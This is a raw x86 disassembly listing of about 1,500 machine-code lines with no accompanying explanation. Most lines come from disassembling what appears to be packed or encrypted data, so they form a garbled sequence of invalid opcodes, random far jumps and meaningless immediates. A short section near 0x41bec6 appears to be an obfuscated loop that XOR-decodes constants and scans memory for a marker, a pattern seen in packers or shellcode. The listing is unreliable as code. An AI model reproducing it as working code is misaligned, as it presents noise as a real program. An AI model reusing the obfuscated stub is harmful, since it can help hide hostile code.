  41bb4e:	ins    DWORD PTR es:[edi],dx
  41bb4f:	xor    eax,0xb0c6550f
  41bb54:	adc    DWORD PTR ds:0xca3b0c1f,ebx
  41bb5a:	push   edi
  41bb5b:	jmp    0xa5b94ed5
  41bb60:	and    ebp,DWORD PTR [eax+0x726cab42]
  41bb66:	stos   DWORD PTR es:[edi],eax
  41bb67:	das    
  41bb68:	mov    dl,0x48
  41bb6a:	test   eax,0x9786fbe2
  41bb6f:	test   ch,ah
  41bb71:	mov    BYTE PTR [ebp+0x4c],dh
  41bb74:	test   eax,0xffa5215e
  41bb79:	xchg   edx,eax
  41bb7a:	xchg   ecx,eax
  41bb7b:	popf   
  41bb7c:	pop    edi
  41bb7d:	les    eax,FWORD PTR [ecx]
  41bb7f:	dec    edx
  41bb80:	inc    esp
  41bb81:	push   esi
  41bb82:	push   eax
  41bb83:	aam    0xea
  41bb85:	jmp    0xe5db:0x5a51a67e
  41bb8c:	test   eax,0xb5fb7fbe
  41bb91:	test   cl,bh
  41bb93:	xor    al,dl
  41bb95:	aam    0xd2
  41bb97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb98:	mov    eax,ds:0x7a010a7d
  41bb9d:	aam    0xbb
  41bb9f:	push   0x25
  41bba1:	cmp    dh,cl
  41bba3:	sbb    dh,BYTE PTR [edx+0x37575477]
  41bba9:	test   al,0x58
  41bbab:	sar    BYTE PTR [eax],1
  41bbad:	sub    dh,al
  41bbaf:	pushf  
  41bbb0:	call   0xeb6a:0xcfd09f41
  41bbb7:	adc    eax,0xee66ac00
  41bbbc:	scas   eax,DWORD PTR es:[edi]
  41bbbd:	dec    edi
  41bbbe:	loopne 0x41bb9b
  41bbc0:	mov    DWORD PTR [ebx],edx
  41bbc2:	ins    DWORD PTR es:[edi],dx
  41bbc3:	adc    bl,bl
  41bbc5:	or     ebx,DWORD PTR [eax+0x2457b849]
  41bbcb:	inc    ebx
  41bbcc:	add    edx,DWORD PTR [ebp-0x4d4a72ca]
  41bbd2:	ins    BYTE PTR es:[edi],dx
  41bbd3:	je     0x41bc51
  41bbd5:	xor    DWORD PTR [edi],ecx
  41bbd7:	lea    edx,[ecx-0x11]
  41bbda:	xor    DWORD PTR ds:0x91dd8887,ecx
  41bbe0:	(bad)  
  41bbe1:	jnp    0x41bb7b
  41bbe3:	out    0x5b,eax
  41bbe5:	inc    edx
  41bbe6:	xor    eax,0xc72253a1
  41bbeb:	call   0x12f22a9a
  41bbf0:	test   BYTE PTR [esi-0x26a6328c],dh
  41bbf6:	adc    DWORD PTR [edi+0x59],0xffffff8b
  41bbfa:	xor    BYTE PTR [edi-0x7e],0x14
  41bbfe:	mov    al,0xd0
  41bc00:	xchg   esp,eax
  41bc01:	std    
  41bc02:	cmc    
  41bc03:	pop    edx
  41bc04:	dec    esp
  41bc06:	mov    WORD PTR [ebx+0x1999b76f],fs
  41bc0c:	lock mov al,ds:0x43f4e004
  41bc12:	mov    ecx,0xac7022fb
  41bc17:	fisttp WORD PTR [ecx+0x71]
  41bc1a:	arpl   WORD PTR [esi-0x75978f2c],cx
  41bc20:	jno    0x41bc50
  41bc22:	fst    DWORD PTR [eax]
  41bc24:	icebp  
  41bc25:	pop    eax
  41bc26:	adc    bh,BYTE PTR [edx]
  41bc28:	rol    DWORD PTR [edi+eiz*8-0x486d9e9],1
  41bc2f:	pushf  
  41bc30:	rol    DWORD PTR [eax+0x56e1aa23],1
  41bc36:	sti    
  41bc37:	outs   dx,BYTE PTR ds:[esi]
  41bc38:	mov    edx,DWORD PTR [eax-0x5a9c6bc6]
  41bc3e:	mov    WORD PTR ds:0xce64e768,?
  41bc44:	retf   
  41bc45:	test   al,0x7b
  41bc47:	cmp    al,0xad
  41bc49:	ror    BYTE PTR [esi-0x51387bf2],1
  41bc4f:	sti    
  41bc50:	inc    ebx
  41bc51:	mov    ds:0xa789b72f,eax
  41bc56:	sub    edi,esi
  41bc58:	mov    ah,0x43
  41bc5a:	jns    0x41bc55
  41bc5c:	retf   0x6ae8
  41bc5f:	sbb    ch,BYTE PTR [edi]
  41bc61:	stos   DWORD PTR es:[edi],eax
  41bc62:	fwait
  41bc63:	pop    ds
  41bc64:	add    BYTE PTR [ebx+0x8],al
  41bc67:	sti    
  41bc68:	add    BYTE PTR [edi],al
  41bc6a:	xchg   ecx,eax
  41bc6b:	repz mov eax,esi
  41bc6e:	mov    bl,dh
  41bc70:	sar    ebp,cl
  41bc72:	pop    ds
  41bc73:	or     al,0x1f
  41bc75:	iret   
  41bc76:	inc    ebx
  41bc77:	jae    0x41bc16
  41bc79:	in     al,0x56
  41bc7b:	test   bl,ch
  41bc7d:	jecxz  0x41bcb2
  41bc7f:	les    ebx,FWORD PTR ds:0xbd1c46c
  41bc85:	add    al,0x31
  41bc87:	ins    DWORD PTR es:[edi],dx
  41bc88:	and    edi,DWORD PTR [edi+esi*1-0x30fb9f45]
  41bc8f:	jg     0x41bcca
  41bc91:	add    eax,0x31bef760
  41bc96:	mov    cl,0xf6
  41bc98:	nop
  41bc99:	daa    
  41bc9a:	ins    BYTE PTR es:[edi],dx
  41bc9b:	addr16 pop ebx
  41bc9d:	int    0x34
  41bc9f:	repz rep outs dx,BYTE PTR ds:[si]
  41bca3:	ins    DWORD PTR es:[edi],dx
  41bca4:	cmp    eax,0x2a416f24
  41bca9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcaa:	ret    
  41bcab:	lock mov ah,0xdf
  41bcae:	add    esi,esp
  41bcb0:	mov    dl,0xcb
  41bcb2:	add    BYTE PTR [eax],ch
  41bcb4:	dec    ebx
  41bcb5:	sub    eax,DWORD PTR [edi+0x18ca43e0]
  41bcbb:	shl    DWORD PTR [esi],cl
  41bcbd:	or     BYTE PTR [esi],0xbe
  41bcc0:	xor    BYTE PTR [edi],ah
  41bcc2:	das    
  41bcc3:	mov    dl,0x3a
  41bcc5:	cmc    
  41bcc6:	das    
  41bcc7:	mov    cl,0x64
  41bcc9:	daa    
  41bcca:	dec    edi
  41bccb:	jecxz  0x41bd34
  41bccd:	mov    WORD PTR [esi+0x5f8001a4],?
  41bcd3:	add    DWORD PTR [edi+0x60838e13],ecx
  41bcd9:	mov    ds:0x2bc4e8ab,al
  41bcde:	sar    BYTE PTR [ebx+0x60c61c28],cl
  41bce4:	jno    0x41bcc8
  41bce6:	or     DWORD PTR [eax],ebp
  41bce8:	cmp    eax,edx
  41bcea:	inc    edx
  41bceb:	fadd   QWORD PTR [eax+edi*4]
  41bcee:	mov    edx,0x17e77852
  41bcf3:	psrld  mm0,QWORD PTR [edx]
  41bcf6:	xchg   edx,eax
  41bcf7:	popf   
  41bcf8:	sbb    DWORD PTR [ebp-0x63],0xffffffa0
  41bcfc:	xchg   esi,eax
  41bcfd:	out    0x4a,al
  41bcff:	xchg   ebx,eax
  41bd00:	or     DWORD PTR [esp+eax*4+0x2a363b30],edi
  41bd07:	enter  0x9adf,0x9f
  41bd0b:	mov    esp,0xf7d56623
  41bd10:	jp     0x41bcf2
  41bd12:	dec    edi
  41bd13:	ficomp WORD PTR [esi-0x6d]
  41bd16:	mov    bh,0x39
  41bd18:	or     DWORD PTR [ebp-0x5f24fb20],esp
  41bd1e:	mov    ebp,0xf7abf952
  41bd23:	ins    DWORD PTR es:[edi],dx
  41bd24:	push   esp
  41bd25:	adc    BYTE PTR [eax+0x2e],ch
  41bd28:	adc    dl,BYTE PTR [edi]
  41bd2a:	pop    edi
  41bd2b:	nop
  41bd2c:	push   cs
  41bd2d:	retf   
  41bd2e:	aad    0xa
  41bd30:	pop    ss
  41bd31:	aaa    
  41bd32:	xor    al,0xb3
  41bd34:	dec    edx
  41bd35:	sub    al,0xfb
  41bd37:	jb     0x41bcf4
  41bd39:	ds imul edx,ebx,0xffffff80
  41bd3d:	cmp    ebx,ebx
  41bd3f:	adc    al,BYTE PTR [esi]
  41bd41:	or     al,0x1f
  41bd43:	stc    
  41bd44:	shl    BYTE PTR [edi-0x1c],1
  41bd47:	adc    al,0x7d
  41bd49:	xchg   esp,eax
  41bd4a:	cmp    edi,0xffffff92
  41bd4d:	cli    
  41bd4e:	jmp    0x448d:0xb8f58ec5
  41bd55:	xchg   esp,eax
  41bd56:	push   DWORD PTR [edx]
  41bd58:	fcomip st,st(4)
  41bd5a:	sbb    eax,0x4f80465a
  41bd5f:	cmp    ecx,DWORD PTR [ebx+edx*4]
  41bd62:	dec    bx
  41bd64:	mov    ch,0x24
  41bd66:	stc    
  41bd67:	test   BYTE PTR [eax-0x79e2379a],ah
  41bd6d:	pop    edx
  41bd6e:	ins    DWORD PTR es:[edi],dx
  41bd6f:	loop   0x41bda5
  41bd71:	(bad)  
  41bd72:	aaa    
  41bd73:	cmp    eax,0xb42ba07c
  41bd78:	dec    esp
  41bd79:	out    0x77,al
  41bd7b:	inc    edx
  41bd7c:	pop    es
  41bd7d:	jecxz  0x41bd9c
  41bd7f:	lods   eax,DWORD PTR ds:[esi]
  41bd80:	mov    esp,0xf9e4a9e3
  41bd85:	mov    ebp,0x2538ef5c
  41bd8a:	push   edi
  41bd8b:	or     DWORD PTR [edi],ebx
  41bd8d:	(bad)  
  41bd8e:	and    al,0xd9
  41bd90:	pop    edx
  41bd91:	sti    
  41bd92:	fwait
  41bd93:	xor    ch,ch
  41bd95:	mov    eax,ds:0xeea4766c
  41bd9a:	jl     0x41bd22
  41bd9c:	pop    ss
  41bd9d:	xchg   ebx,eax
  41bd9e:	pop    ss
  41bd9f:	xor    BYTE PTR [eax],al
  41bda1:	and    esp,edx
  41bda3:	test   BYTE PTR [esi+0x6d],bh
  41bda6:	or     dl,BYTE PTR [edx-0x7c]
  41bda9:	gs loopne 0x41bd3a
  41bdac:	repz and BYTE PTR [edx+eiz*8+0x1280147b],dh
  41bdb4:	mov    edi,0x426235a1
  41bdb9:	lds    ecx,FWORD PTR [ebx]
  41bdbb:	xchg   edx,eax
  41bdbc:	pop    esi
  41bdbd:	jl     0x41bdf1
  41bdbf:	mov    eax,ds:0xe07e9bff
  41bdc4:	xchg   esp,eax
  41bdc5:	imul   BYTE PTR [edi+0x1]
  41bdc8:	push   ebx
  41bdc9:	imul   ebp,DWORD PTR [ebp-0x3be325ef],0x1f
  41bdd0:	(bad)  
  41bdd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdd2:	jae    0x41be35
  41bdd4:	dec    ebp
  41bdd5:	shl    ebx,1
  41bdd7:	mov    BYTE PTR [edi-0x40],cl
  41bdda:	jl     0x41bda7
  41bddc:	mov    ds:0x51061432,al
  41bde1:	push   edx
  41bde2:	push   0xffffffd1
  41bde4:	or     eax,0x5c88fe7b
  41bde9:	inc    eax
  41bdea:	inc    esp
  41bdeb:	jl     0x41bdef
  41bded:	sub    eax,0x267d0ace
  41bdf2:	sbb    ebp,ebx
  41bdf4:	jae    0x41bd7f
  41bdf6:	adc    esp,DWORD PTR [eax]
  41bdf8:	fwait
  41bdf9:	mov    ebp,0xf9baa252
  41bdfe:	pop    eax
  41bdff:	shl    DWORD PTR [eax+eax*4-0x6426d609],0x60
  41be07:	mov    ebx,0xdb7ee07a
  41be0c:	inc    esp
  41be0d:	stos   DWORD PTR es:[edi],eax
  41be0e:	test   BYTE PTR [edi],bl
  41be10:	push   ds
  41be11:	or     dl,bh
  41be13:	push   ebx
  41be14:	fild   DWORD PTR ds:0x6e4a6eb8
  41be1a:	popw   ss
  41be1c:	in     al,dx
  41be1d:	sbb    eax,0x552cd1a2
  41be22:	pop    ss
  41be23:	popf   
  41be24:	popf   
  41be25:	cld    
  41be26:	dec    ecx
  41be27:	dec    edi
  41be28:	lods   al,BYTE PTR ds:[esi]
  41be29:	mov    esi,0xa3939647
  41be2e:	jl     0x41bde1
  41be30:	xchg   ecx,eax
  41be31:	xchg   ecx,eax
  41be32:	imul   DWORD PTR [ebx+0x63]
  41be35:	sbb    ebx,eax
  41be37:	dec    ebx
  41be38:	adc    eax,DWORD PTR [eax]
  41be3a:	jp     0x41be57
  41be3c:	sub    eax,0xe307a176
  41be41:	mov    al,ds:0x40c162f3
  41be46:	sub    eax,0x787df1fc
  41be4b:	jmp    0x41be42
  41be4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be4f:	mul    DWORD PTR [ecx]
  41be51:	and    ecx,DWORD PTR [ebp+ecx*1-0x31f0c023]
  41be58:	add    BYTE PTR [edi-0x58],0x0
  41be5c:	jb     0x41be77
  41be5e:	iret   
  41be5f:	lock sahf 
  41be61:	data16 sbb BYTE PTR [eax],bh
  41be64:	sub    ebx,DWORD PTR [edi-0x76]
  41be67:	and    al,BYTE PTR [ecx-0x1ae0dbf2]
  41be6d:	or     eax,0x45b7846c
  41be72:	mov    WORD PTR [edx-0x7b0881ba],ss
  41be78:	or     DWORD PTR [eax-0x67],0x26
  41be7c:	xchg   DWORD PTR [edx],ebx
  41be7e:	adc    eax,DWORD PTR [ecx]
  41be80:	test   eax,esp
  41be82:	aas    
  41be83:	push   0xffffff8c
  41be85:	jnp    0x41bed4
  41be87:	push   0x32
  41be89:	dec    esp
  41be8a:	cwde   
  41be8b:	stos   BYTE PTR es:[edi],al
  41be8c:	sub    eax,0x7cdd3026
  41be91:	jbe    0x41be2a
  41be93:	inc    edx
  41be94:	stos   DWORD PTR es:[edi],eax
  41be95:	pop    esp
  41be96:	sbb    edx,DWORD PTR [ebx-0x15]
  41be99:	mov    eax,fs
  41be9b:	out    dx,al
  41be9c:	adc    BYTE PTR [esi-0x71193311],al
  41bea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bea3:	mov    edi,0xdb27f607
  41bea8:	inc    eax
  41bea9:	or     BYTE PTR [edx+0x472aa2bb],ch
  41beaf:	out    0x63,al
  41beb1:	mov    ds:0x969113b8,al
  41beb6:	lods   eax,DWORD PTR ds:[esi]
  41beb7:	cli    
  41beb8:	pop    eax
  41beb9:	mov    dl,0x25
  41bebb:	xor    esi,ecx
  41bebd:	mov    edi,0xffcd8d08
  41bec2:	sub    edi,esi
  41bec4:	add    DWORD PTR [eax],edi
  41bec6:	jmp    0x41bed1
  41becb:	xor    esi,ecx
  41becd:	add    esi,edx
  41becf:	add    DWORD PTR [eax],esi
  41bed1:	mov    eax,DWORD PTR [ebp-0x8]
  41bed4:	mov    esi,DWORD PTR [ebp-0x10]
  41bed7:	mov    eax,DWORD PTR [eax]
  41bed9:	xor    esi,ecx
  41bedb:	add    esi,0x3272f7
  41bee1:	mov    DWORD PTR [ebp-0x28],0x7097b859
  41bee8:	mov    DWORD PTR [ebp-0x24],ebx
  41beeb:	not    esi
  41beed:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41bef4:	mov    DWORD PTR [ebp-0x2c],ebx
  41bef7:	mov    ebx,DWORD PTR [ebp-0x28]
  41befa:	mov    edi,DWORD PTR [ebp-0x24]
  41befd:	and    eax,esi
  41beff:	mov    esi,0xa145
  41bf04:	xor    bx,si
  41bf07:	mov    esi,0x4131
  41bf0c:	add    bx,si
  41bf0f:	cmp    WORD PTR [eax],bx
  41bf12:	je     0x41bf5c
  41bf18:	mov    edi,DWORD PTR [ebp-0x10]
  41bf1b:	xor    edi,ecx
  41bf1d:	mov    DWORD PTR [ebp-0x28],0x7097b859
  41bf24:	mov    DWORD PTR [ebp-0x24],0xffffffff
  41bf2b:	mov    ebx,0xffcd8d08
  41bf30:	sub    ebx,edi
  41bf32:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41bf39:	add    eax,ebx
  41bf3b:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  41bf42:	mov    edi,DWORD PTR [ebp-0x28]
  41bf45:	mov    ebx,DWORD PTR [ebp-0x24]
  41bf48:	mov    ebx,0xa145
  41bf4d:	xor    di,bx
  41bf50:	add    di,si
  41bf53:	cmp    WORD PTR [eax],di
  41bf56:	jne    0x41bf18
  41bf5c:	mov    edi,DWORD PTR [ebp-0x14]
  41bf5f:	jmp    0x41e319
  41bf64:	retf   0xd5df
  41bf67:	pop    esi
  41bf68:	idiv   BYTE PTR [edx+0x7a]
  41bf6b:	addr16 cmp al,0xf6
  41bf6e:	push   ebx
  41bf6f:	into   
  41bf70:	inc    ebp
  41bf71:	in     eax,0xfe
  41bf73:	jns    0x41bf59
  41bf75:	add    BYTE PTR [ebx+edi*2+0x18],bh
  41bf79:	sahf   
  41bf7a:	jnp    0x41bff7
  41bf7c:	push   ebx
  41bf7d:	inc    ebx
  41bf7e:	sbb    eax,DWORD PTR [edi+esi*1]
  41bf81:	(bad)  
  41bf82:	shr    DWORD PTR [edi+ebx*2+0x32],0xd5
  41bf87:	jo     0x41bfc2
  41bf89:	or     eax,0x4911f257
  41bf8e:	mov    eax,ds:0x2765b3b6
  41bf93:	sbb    dh,bl
  41bf95:	aam    0x30
  41bf97:	jnp    0x41bf3d
  41bf99:	push   es
  41bf9a:	lods   eax,DWORD PTR ds:[esi]
  41bf9b:	cmp    al,0xc4
  41bf9d:	pushf  
  41bf9e:	sbb    cl,BYTE PTR [ebx+0x37e9cc97]
  41bfa4:	jp     0x41c022
  41bfa6:	jne    0x41bf6a
  41bfa8:	out    0x46,eax
  41bfaa:	in     eax,0x57
  41bfac:	or     al,0x6e
  41bfae:	paddusb mm0,QWORD PTR [edx+edx*8-0x18f1d58a]
  41bfb6:	xor    eax,0xafe50197
  41bfbb:	push   es
  41bfbc:	in     eax,dx
  41bfbd:	mov    ch,0x23
  41bfbf:	imul   ebx,DWORD PTR [ebx-0x3c4f77a4],0xfffffff0
  41bfc6:	mov    eax,0xd42935b3
  41bfcb:	mov    ecx,0xdebfb783
  41bfd0:	cs stc 
  41bfd2:	mov    edi,DWORD PTR [eax+0x7aac379e]
  41bfd8:	ret    0x8821
  41bfdb:	sub    DWORD PTR [edx-0x4e27730d],eax
  41bfe1:	repz xchg esi,eax
  41bfe3:	pop    ss
  41bfe4:	xchg   ebp,eax
  41bfe5:	mov    BYTE PTR [ebx+0x76],ah
  41bfe8:	call   0xf08:0xc32fa42a
  41bfef:	inc    eax
  41bff0:	inc    esi
  41bff1:	mov    ds:0x2acfe965,eax
  41bff6:	cli    
  41bff7:	jp     0x41c034
  41bff9:	jno    0x41c038
  41bffb:	xchg   ebx,eax
  41bffc:	daa    
  41bffd:	push   ebx
  41bffe:	pushf  
  41bfff:	loopne 0x41c040
  41c001:	mov    al,bl
  41c003:	mov    edi,0xade0edde
  41c008:	test   eax,0xc0215f4f
  41c00d:	pop    ss
  41c00e:	js     0x41c015
  41c010:	js     0x41c017
  41c012:	mov    ebx,DWORD PTR [ebp+0x2fef1fe6]
  41c018:	jecxz  0x41bfe8
  41c01a:	cli    
  41c01b:	inc    edi
  41c01c:	ds jecxz 0x41bff7
  41c01f:	push   0xc8739e27
  41c024:	adc    edi,edi
  41c026:	xor    ch,BYTE PTR [esi]
  41c028:	lock sub ah,dh
  41c02b:	push   esi
  41c02c:	mov    al,ds:0x85c4dc92
  41c031:	adc    ch,BYTE PTR [eax+esi*1-0x1863a47a]
  41c038:	mov    edx,0xf7cf3e47
  41c03d:	aam    0xdc
  41c03f:	and    esi,DWORD PTR ds:0x9e9fc983
  41c045:	and    BYTE PTR [esi+eax*4-0x6cd270d4],ah
  41c04c:	jbe    0x41c06e
  41c04e:	jle    0x41c0c6
  41c050:	(bad)  
  41c051:	cs test al,0x2a
  41c054:	push   edi
  41c055:	ret    
  41c056:	xchg   ebp,eax
  41c057:	push   es
  41c058:	sbb    eax,0x1cda7071
  41c05d:	loop   0x41c07e
  41c05f:	xlat   BYTE PTR ds:[ebx]
  41c060:	icebp  
  41c061:	or     bh,ah
  41c063:	rcr    edx,0x18
  41c066:	aad    0xa7
  41c068:	aas    
  41c069:	sbb    al,BYTE PTR [edi-0x76]
  41c06c:	mov    al,0x55
  41c06e:	leavew 
  41c070:	mov    ch,0x22
  41c072:	addr16 dec esp
  41c074:	mov    cl,0xf1
  41c076:	xor    esi,edi
  41c078:	fild   DWORD PTR [ebp+0x6d]
  41c07b:	test   eax,0x70017c2e
  41c080:	mov    al,0x9
  41c082:	daa    
  41c083:	xor    al,0xdb
  41c085:	jmp    0x12fa407c
  41c08a:	out    0xb0,al
  41c08c:	fimul  DWORD PTR [ebp-0xe8bdbdf]
  41c092:	xlat   BYTE PTR ds:[ebx]
  41c093:	int    0x3e
  41c095:	inc    edx
  41c096:	call   0x528e86a1
  41c09b:	ret    
  41c09c:	pop    eax
  41c09d:	cmp    DWORD PTR [esi-0x3becb378],edi
  41c0a3:	jne    0x41c0f8
  41c0a5:	retf   0xe5d2
  41c0a8:	(bad)
  41c0ad:	jb     0x41c040
  41c0af:	(bad)  [ebp-0x12]
  41c0b2:	scas   al,BYTE PTR es:[edi]
  41c0b3:	xlat   BYTE PTR ds:[ebx]
  41c0b5:	loop   0x41c0fb
  41c0b7:	jb     0x8736cadd
  41c0bd:	lea    esi,[ecx]
  41c0bf:	(bad)  
  41c0c0:	fild   WORD PTR [ecx]
  41c0c2:	cmp    ebx,DWORD PTR [ecx-0x27]
  41c0c5:	call   0x9420:0x8d97c305
  41c0cc:	inc    ecx
  41c0cd:	out    0x13,eax
  41c0cf:	xchg   esi,eax
  41c0d0:	test   eax,0x64945370
  41c0d5:	dec    ebp
  41c0d6:	or     al,BYTE PTR [edx+0x2d1d5d3a]
  41c0dc:	rcr    DWORD PTR [ebx],0xf4
  41c0df:	cdq    
  41c0e0:	or     dh,bh
  41c0e2:	xor    BYTE PTR [ecx+0x51],dl
  41c0e5:	aam    0x33
  41c0e7:	pop    es
  41c0e8:	fbld   TBYTE PTR [eax]
  41c0ea:	dec    ebx
  41c0eb:	add    DWORD PTR [esi-0x6414f5a9],edx
  41c0f1:	std    
  41c0f2:	enter  0x2647,0xa3
  41c0f6:	cmc    
  41c0f7:	add    esp,ecx
  41c0f9:	mov    esi,0xb2903179
  41c0fe:	pop    eax
  41c0ff:	mov    cl,BYTE PTR [esi]
  41c101:	js     0x41c139
  41c103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c104:	cmp    DWORD PTR ds:0x33c3ed36,0xffffffa0
  41c10b:	dec    esi
  41c10c:	jmp    0xf079:0x15423105
  41c113:	adc    dl,BYTE PTR [ebx+0x7ca80008]
  41c119:	test   BYTE PTR [esi+0x51],bl
  41c11c:	push   es
  41c11d:	mov    ah,BYTE PTR ds:0x44b9ff72
  41c123:	mov    ch,0x4f
  41c125:	or     al,0x25
  41c127:	popa   
  41c128:	push   edi
  41c129:	bnd jns 0x41c14e
  41c12c:	or     ecx,ebp
  41c12e:	test   BYTE PTR [esi+eiz*1-0x26],cl
  41c132:	inc    esi
  41c133:	inc    ebp
  41c134:	jmp    0x564340c5
  41c139:	sub    DWORD PTR [edx],edi
  41c13b:	in     al,dx
  41c13c:	iret   
  41c13d:	xlat   BYTE PTR ds:[ebx]
  41c13e:	test   BYTE PTR [esi-0x7],ah
  41c141:	out    0xe3,eax
  41c143:	xor    eax,edi
  41c145:	fst    DWORD PTR [esi]
  41c147:	adc    al,0x19
  41c149:	les    ebx,FWORD PTR [eax+ecx*4-0x19280f7d]
  41c150:	enter  0xf915,0x7c
  41c154:	repnz pop ds
  41c156:	out    dx,al
  41c157:	ret    
  41c158:	push   ebx
  41c159:	jl     0x41c161
  41c15b:	jb     0x41c185
  41c15d:	dec    eax
  41c15e:	jge    0x41c196
  41c160:	stos   DWORD PTR es:[edi],eax
  41c161:	xchg   ecx,edi
  41c163:	sbb    al,0xb4
  41c165:	lock jbe 0x41c1a0
  41c168:	mov    eax,ds:0x920c1f1c
  41c16d:	fwait
  41c16e:	bound  ecx,QWORD PTR [esi+0x50277104]
  41c174:	ret    
  41c175:	mov    ah,dl
  41c177:	xchg   eax,edx
  41c179:	xchg   DWORD PTR [edi],esp
  41c17b:	fwait
  41c17c:	cmp    bh,dl
  41c17e:	dec    ebx
  41c17f:	xchg   ecx,eax
  41c180:	int3   
  41c181:	push   0x48
  41c183:	out    0x80,al
  41c185:	push   ebp
  41c186:	dec    edx
  41c187:	repz shr DWORD PTR [eax-0x40f573b2],cl
  41c18e:	call   0x8674:0x425876f2
  41c195:	fadd   st(7),st
  41c197:	aam    0x35
  41c199:	or     bl,ch
  41c19b:	dec    ebx
  41c19c:	sbb    ebx,DWORD PTR [esi+0x28320137]
  41c1a2:	ja     0x41c195
  41c1a4:	adc    al,0x49
  41c1a6:	inc    ecx
  41c1a7:	scas   al,BYTE PTR es:[edi]
  41c1a8:	pop    esi
  41c1a9:	imul   ecx,edx,0xc9248723
  41c1af:	ficomp WORD PTR [edx]
  41c1b1:	jns    0x41c209
  41c1b3:	and    al,0x4f
  41c1b5:	outs   dx,DWORD PTR ds:[esi]
  41c1b6:	sub    eax,0x327c744d
  41c1bb:	lea    ebp,[ebx+0x5e]
  41c1be:	xchg   ebp,eax
  41c1bf:	pop    ebp
  41c1c0:	int3   
  41c1c1:	ja     0x41c17c
  41c1c3:	call   0x6023debb
  41c1c8:	aas    
  41c1c9:	shl    eax,1
  41c1cb:	mov    BYTE PTR [eax],dh
  41c1cd:	mov    edi,0x32f079b2
  41c1d2:	rol    BYTE PTR [ebx],1
  41c1d4:	jg     0x41c230
  41c1d6:	jle    0x41c24e
  41c1d8:	mov    ah,0xab
  41c1da:	leave  
  41c1db:	cmp    bl,BYTE PTR [ebp+0x399ca116]
  41c1e1:	js     0x41c1da
  41c1e3:	into   
  41c1e4:	stos   BYTE PTR es:[edi],al
  41c1e5:	(bad)  [eax+0x423bd75e]
  41c1eb:	mov    eax,0xf62cf519
  41c1f0:	mov    esi,0x12d2accb
  41c1f5:	in     al,0x29
  41c1f7:	add    al,0x80
  41c1f9:	cvtpi2ps xmm6,QWORD PTR [eax]
  41c1fc:	imul   edi,DWORD PTR [ecx-0x3],0xc3e5ddf9
  41c203:	loopne 0x41c24a
  41c205:	inc    esp
  41c206:	retf   0x5982
  41c209:	call   0x3e1e:0x692b0717
  41c210:	xor    al,0x6a
  41c212:	xor    DWORD PTR [eax+0x6e],esp
  41c215:	pop    ebp
  41c216:	pusha  
  41c217:	enter  0x9217,0x22
  41c21b:	mov    eax,ds:0xc7d1531
  41c220:	inc    edi
  41c221:	das    
  41c222:	in     eax,dx
  41c223:	out    dx,eax
  41c224:	push   eax
  41c225:	jmp    0x9cbe:0x839f05f3
  41c22c:	adc    DWORD PTR [edx+0x7],ebx
  41c22f:	pop    edi
  41c230:	jbe    0x41c29b
  41c232:	stc    
  41c233:	sbb    al,0x7f
  41c235:	ss js  0x41c291
  41c238:	lea    ebp,[edi+eax*8+0x7cf1e3a1]
  41c23f:	mov    eax,ds:0xbf7d53a3
  41c244:	mov    edi,0xcc9c3de3
  41c249:	sbb    al,0xb1
  41c24b:	mov    ch,0xfb
  41c24d:	xor    DWORD PTR [edx+0x4bfba7cd],0xa56e0125
  41c257:	mov    al,0x24
  41c259:	mov    al,ds:0x1021fb38
  41c25e:	sub    eax,DWORD PTR ds:0x2bf2af24
  41c264:	adc    al,0xd4
  41c266:	lds    ebx,FWORD PTR [eax+0x23610647]
  41c26c:	mov    edi,0x2877cd9
  41c271:	(bad)  
  41c272:	xchg   edx,eax
  41c273:	push   cs
  41c274:	ret    0x4b31
  41c277:	xor    BYTE PTR [edi+0x7b],cl
  41c27a:	aad    0xb7
  41c27c:	pushf  
  41c27d:	pop    edx
  41c27e:	inc    esp
  41c27f:	call   0x82ca:0xe4ab71b2
  41c286:	pushf  
  41c287:	outs   dx,BYTE PTR ds:[esi]
  41c288:	add    bl,al
  41c28a:	inc    esi
  41c28b:	or     al,0xff
  41c28d:	aam    0x3
  41c28f:	mov    ch,0x3c
  41c291:	or     BYTE PTR [ebx-0x6b],bl
  41c294:	jmp    0xaf9a:0xbcb979ba
  41c29b:	call   0x131c59ba
  41c2a0:	ds xchg esp,eax
  41c2a2:	mov    ds:0xd3be8a9e,eax
  41c2a7:	out    dx,eax
  41c2a8:	test   BYTE PTR [ecx],ah
  41c2aa:	dec    esp
  41c2ab:	fcmovnu st,st(0)
  41c2ad:	pmaddwd mm4,mm7
  41c2b0:	(bad)  
  41c2b2:	test   DWORD PTR [edx-0x72bbc75a],ebx
  41c2b8:	xor    esp,esp
  41c2ba:	pop    ss
  41c2bb:	push   ecx
  41c2bc:	aaa    
  41c2bd:	and    DWORD PTR ds:0xa183011e,eax
  41c2c3:	(bad)  
  41c2c4:	leave  
  41c2c5:	or     BYTE PTR [edx+ecx*1],bh
  41c2c8:	pushf  
  41c2c9:	cs loope 0x41c34a
  41c2cc:	cwde   
  41c2cd:	(bad)  
  41c2cf:	fstp   DWORD PTR [ecx]
  41c2d1:	add    eax,DWORD PTR [ecx]
  41c2d3:	xlat   BYTE PTR ds:[ebx]
  41c2d4:	mov    ebp,DWORD PTR [edi+esi*1]
  41c2d7:	out    0x4,al
  41c2d9:	jmp    0x95d065dc
  41c2de:	lods   eax,DWORD PTR ds:[esi]
  41c2df:	jb     0x41c34e
  41c2e1:	adc    BYTE PTR [eax],bh
  41c2e3:	retf   
  41c2e4:	xor    DWORD PTR [eax+0x4b],ecx
  41c2e7:	pop    ebp
  41c2e8:	xchg   ebp,eax
  41c2e9:	lock stc 
  41c2eb:	inc    ebp
  41c2ec:	jmp    0xe85f8c88
  41c2f1:	inc    esp
  41c2f2:	push   es
  41c2f3:	adc    esi,DWORD PTR [esp+edi*1-0x3811ff89]
  41c2fa:	jmp    0x872d6ccd
  41c2ff:	adc    dl,BYTE PTR [ecx]
  41c301:	adc    ebp,ecx
  41c303:	adc    eax,0x66a04ca9
  41c308:	les    ebp,FWORD PTR [esi-0x51]
  41c30b:	or     BYTE PTR [ecx],ah
  41c30d:	lds    edx,FWORD PTR [esi+eax*8-0x7e]
